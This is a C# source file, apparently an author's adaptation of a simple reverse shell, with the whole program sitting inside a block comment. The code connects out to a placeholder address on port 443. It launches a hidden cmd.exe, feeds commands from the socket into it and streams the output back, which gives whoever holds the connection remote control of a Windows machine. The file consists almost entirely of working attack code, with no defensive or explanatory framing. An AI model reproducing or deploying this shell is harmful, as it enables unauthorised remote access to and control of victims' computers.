//Author:X3aSS3xE
//Date: 01/25/2020
//Revere Shell in CSharp based off of Simple Reverse Shell
/*
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;

namespace _ConBac
{
        public class Program
        {
                static StreamWriter streWrit;
                public static void Main(string[] args)
                {
                        using(TcpClient client =  new TcpClient("0.0.0.0",443))
                        {
                                using(Stream stream = client.GetStream())
                                {
                                        using(StreamReader rdr = new StreamReader(stream))
                                        {
                                                streWrit = new StreamWriter(stream);

                                                StringBuilder strInput = new StringBuilder();

                                                Process p =  new Process();
                                                p.StartInfo.FileName = "cmd.exe";
                                                p.StartInfo.CreateNoWindow = true;
                                                p.StartInfo.UseShellExecute = false;
                                                p.StartInfo.RedirectStandardOutput = true;
                                                p.StartInfo.RedirectStandardInput = true;
                                                p.StartInfo.RedirectStandardError = true;
                                                p.OutputDataReceived += new DataReceivedEventHandler(_CmdOutDatHand);
                                                p.Start();
                                                p.BeginOutputReadLine();

                                                while(true)
                                                {
                                                        strInput.Append(rdr.ReadLine());
                                                        //strInput.Append("\n")
                                                        p.StandardInput.WriteLine(strInput);
                                                        strInput.Remove(0, strInput.Length);
                                                }
                                        }
                                }
                        }
                }

                private static void _CmdOutDatHand(object sendingProcess, DataReceivedEventArgs outline)
                {
                        StringBuilder strOutput = new StringBuilder();

                        if(!String.IsNullOrEmpty(outline.Data))
                        {
                                try
                                {
                                        strOutput.Append(outline.Data);
                                        streWrit.WriteLine(strOutput);
                                        streWrit.Flush();
                                }
                                catch (Exception err) { }
                        }
                }
        }
}
*/
